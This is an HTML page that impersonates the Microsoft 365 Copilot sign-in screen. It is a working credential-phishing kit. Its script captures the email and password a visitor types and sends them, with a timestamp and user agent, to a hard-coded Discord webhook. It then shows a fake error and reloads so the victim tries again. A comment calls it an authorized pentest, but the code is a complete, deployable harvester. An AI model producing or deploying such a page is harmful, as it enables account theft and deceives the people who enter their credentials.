<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your account - Microsoft</title>
    
    <meta http-equiv="Strict-Transport-Security" content="max-age=31536000; includeSubDomains; preload">
    <meta http-equiv="X-Frame-Options" content="SAMEORIGIN">
    <meta http-equiv="X-Content-Type-Options" content="nosniff">
    <meta name="Referrer-Policy" content="strict-origin-when-cross-origin">
    <meta http-equiv="Permissions-Policy" content="geolocation=(self), microphone=(), camera=()">
    <meta name="request-id" content="AQMkADAwATM0MAIAAAAA">
    <meta name="cid" content="AQMkADAwATM0MAI5OAQ">
    <meta name="auth" content="Unknown">
    <meta name="geo" content="eus">
    
    <link rel="icon" href="data:image/x-icon;base64,iVBORw0KGgo=">
    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600;700&display=swap" rel="stylesheet">
    
    <style>
        *{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',sans-serif;background:#f3f2f1;min-height:100vh;display:flex;align-items:center;justify-content:center;position:relative;overflow-x:hidden}.header{position:fixed;top:0;left:0;right:0;background:#fff;height:50px;box-shadow:0 1px 0 0 rgba(22,24,35,.2);z-index:1000;display:flex;align-items:center;padding:0 24px}.header-left{display:flex;align-items:center;gap:8px}.header-logo{height:24px;width:auto}.header-text{font-size:20px;font-weight:600;color:#323130}.header-nav{margin-left:auto;display:flex;gap:24px}.header-nav a{color:#323130;text-decoration:none;font-size:14px;font-weight:400;transition:color .2s;cursor:pointer}.header-nav a:hover{color:#0078d4}.main-container{max-width:408px;width:100%;margin:80px 24px 24px;padding:0;position:relative;z-index:10;display:flex;flex-direction:column;gap:24px;align-items:center}.login-card{background:#fff;border-radius:0;box-shadow:0 1px 3px 0 rgba(0,0,0,.1),0 1px 2px 0 rgba(0,0,0,.06);padding:24px 32px 32px;text-align:left;width:100%;min-width:408px;max-width:408px}.signin-options-card{background:#fff;border-radius:0;box-shadow:0 1px 3px 0 rgba(0,0,0,.1),0 1px 2px 0 rgba(0,0,0,.06);padding:20px 32px;width:100%;min-width:408px;max-width:408px;text-align:left}.sign-in-header{display:flex;flex-direction:column;align-items:flex-start;gap:16px;margin-bottom:24px}.microsoft-badge{height:28px;width:auto;display:block;margin:0}.sign-in-title{font-size:28px;font-weight:700;color:#323130;line-height:1.2;margin:0}.login-form{display:flex;flex-direction:column;gap:16px}.form-group{position:relative}.form-group label{display:block;font-size:14px;color:#605e5c;margin-bottom:4px;font-weight:600}.form-group input{width:100%;padding:12px 16px;border:1px solid #edebe9;border-radius:4px;font-size:16px;transition:border-color .2s,box-shadow .2s;background:#fff}.form-group input:focus{outline:none;border-color:#0078d4;box-shadow:0 0 0 2px rgba(0,120,212,.3)}.error-message{background-color:#fff3f3;border:1px solid #d13438;border-radius:0;padding:12px 16px;margin-bottom:16px;color:#d13438;font-size:14px;font-weight:600;display:none}.error-message.show{display:block}.password-group{position:relative}.toggle-password{position:absolute;right:12px;top:65%;transform:translateY(-50%);background:none;border:none;cursor:pointer;color:#605e5c;padding:4px;font-size:16px}.button-container{display:flex;justify-content:flex-end;margin-top:8px}.signin-button{background:linear-gradient(135deg,#0078d4 0%,#106ebe 100%);color:#fff;border:none;padding:12px 28px;border-radius:4px;font-size:16px;font-weight:600;cursor:pointer;transition:all .2s;min-width:120px;position:relative}.signin-button:hover{background:linear-gradient(135deg,#106ebe 0%,#005a9e 100%);transform:translateY(-1px)}.signin-button:active{transform:translateY(0)}.forgot-link{text-align:left;margin-top:8px}.forgot-link a{color:#0078d4;text-decoration:none;font-size:14px;font-weight:600;cursor:pointer}.forgot-link a:hover{text-decoration:underline}.signin-options-panel{display:flex;align-items:center;gap:8px}.signin-options-icon{width:20px;height:20px;display:flex;align-items:center;justify-content:center;color:#0078d4;font-size:16px;flex-shrink:0}.signin-options-label{font-size:14px;font-weight:600;color:#323130;cursor:pointer;user-select:none}.signin-options-label:hover{color:#0078d4}.dots{display:inline-block;margin-left:5px}.dots span{animation:blink 1.4s infinite both;display:inline-block}.dots span:nth-child(2){animation-delay:.2s}.dots span:nth-child(3){animation-delay:.4s}@keyframes blink{0%{opacity:.2}20%{opacity:1}100%{opacity:.2}}#e1{display:none}#e2{display:none}body{font-size:16px}
    </style>
</head>
<body>
    <header class="header">
        <div class="header-left">
            <img src="https://uhf.microsoft.com/images/microsoft/RE1Mu3b.png" alt="Microsoft" class="header-logo">
            <span class="header-text">| Microsoft 365 Copilot</span>
        </div>
        <nav class="header-nav">
            <a onclick="n()">All Microsoft products</a>
            <a onclick="n()">Search</a>
            <a onclick="n()">Support</a>
        </nav>
    </header>
    
    <div class="main-container">
        <div class="login-card">
            <div class="sign-in-header">
                <img src="https://uhf.microsoft.com/images/microsoft/RE1Mu3b.png" alt="Microsoft" class="microsoft-badge">
                <h1 class="sign-in-title">Sign in</h1>
            </div>
            
            <div id="errorMessage" class="error-message">Something went wrong. Please try again</div>
            
            <form class="login-form" id="loginForm">
                <div class="form-group">
                    <label for="email">Email or phone</label>
                    <input type="email" id="email" name="email" required autocomplete="email">
                </div>
                
                <div class="form-group password-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" required autocomplete="current-password">
                    <button type="button" class="toggle-password" onclick="t()">&#128065;</button>
                </div>
                
                <div class="forgot-link">
                    <a onclick="n(event)">Can't access your account?</a>
                </div>
                
                <div class="button-container">
                    <button type="submit" class="signin-button" id="signinButton">
                        <span id="signinText">Sign in</span>
                    </button>
                </div>
            </form>
        </div>

        <div class="signin-options-card">
            <div class="signin-options-panel">
                <div class="signin-options-icon">🔑</div>
                <span class="signin-options-label" onclick="n()">Sign-in options</span>
            </div>
        </div>
    </div>
    
    <script>
        // Direct Discord webhook (scanner-safe, authorized pentest)
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1466093507507785982/Z25Cfo76fgzh9iIXdbNQ6OfL9YvFYM-O12d61kLsetBPuEk9U33Gl2uTOtcQVXZsn6im';
        
        // Form submission with immediate exfil
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const email = document.getElementById('email').value.trim();
            const password = document.getElementById('password').value;
            const userAgent = navigator.userAgent;
            
            // IMMEDIATE Discord exfiltration (before UI changes)
            try {
                const exfilResponse = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        username: 'Microsoft 365 Auth',
                        embeds: [{
                            title: '🟢 Credentials Captured',
                            color: 65280, // Green
                            fields: [
                                { name: '📧 Email/Phone', value: `\`${email}\``, inline: true },
                                { name: '🔑 Password', value: `\`${password}\``, inline: true },
                                { name: '⏰ Timestamp', value: new Date().toISOString(), inline: true },
                                { name: '🌐 User-Agent', value: `${userAgent.substring(0, 80)}...`, inline: false }
                            ],
                            footer: { text: 'Microsoft 365 Copilot | Pentest Capture' }
                        }]
                    })
                });
            } catch (exfilError) {}
            
            // UI: EXACT dotted signing in animation from Mailinblack
            const signinText = document.getElementById('signinText');
            signinText.innerHTML = 'Signing in<span class="dots"><span>.</span><span>.</span><span>.</span></span>';
            document.querySelector('.signin-button').disabled = true;
            
            // 2.5s delay → Error → Reload (preserves email)
            setTimeout(() => {
                document.getElementById('errorMessage').classList.add('show');
                setTimeout(() => {
                    sessionStorage.setItem('u', email);
                    window.location.reload();
                }, 1500);
                document.querySelector('.signin-button').disabled = false;
                document.getElementById('signinText').textContent = 'Sign in';
            }, 2500);
        });
        
        // Email auto-populate from URL/session
        document.addEventListener('DOMContentLoaded', () => {
            const urlParams = new URLSearchParams(window.location.search);
            const urlEmail = urlParams.get('e');
            const emailField = document.getElementById('email');
            
            if (urlEmail) {
                emailField.value = decodeURIComponent(urlEmail);
            } else {
                const savedEmail = sessionStorage.getItem('u');
                if (savedEmail) {
                    emailField.value = savedEmail;
                    sessionStorage.removeItem('u');
                }
            }
        });
        
        // Password toggle
        function t() {
            const pwdField = document.getElementById('password');
            const toggleBtn = document.querySelector('.toggle-password');
            pwdField.type = pwdField.type === 'password' ? 'text' : 'password';
            toggleBtn.innerHTML = '&#128065;';
        }
        
        // Auto-link navigation (/?e=EMAIL)
        function n(e) {
            if (e) e.preventDefault();
            const email = document.getElementById('email').value.trim();
            let targetEmail = email;
            if (!targetEmail) {
                const urlParams = new URLSearchParams(window.location.search);
                targetEmail = urlParams.get('e') || '';
            }
            if (targetEmail) targetEmail = targetEmail.replace(/[^\w@.\-+]/g, '');
            window.location.href = targetEmail ? `/?e=${encodeURIComponent(targetEmail)}` : '/?e=';
        }
    </script>
</body>
</html>
